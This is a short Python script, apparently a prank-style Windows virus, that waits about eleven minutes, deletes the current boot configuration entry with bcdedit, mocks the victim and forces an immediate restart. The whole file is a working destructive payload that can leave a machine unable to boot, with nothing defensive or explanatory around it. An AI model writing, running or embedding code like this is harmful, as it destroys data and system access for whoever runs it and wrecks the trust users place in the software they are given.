import time
import os
print("I warned you! wait 6 minutes now")
time.sleep(666)
os.system("bcdedit /delete {current}")
print("You opened a virus ): Your BCD is now gone")
os.system("shutdown -r -t 1")
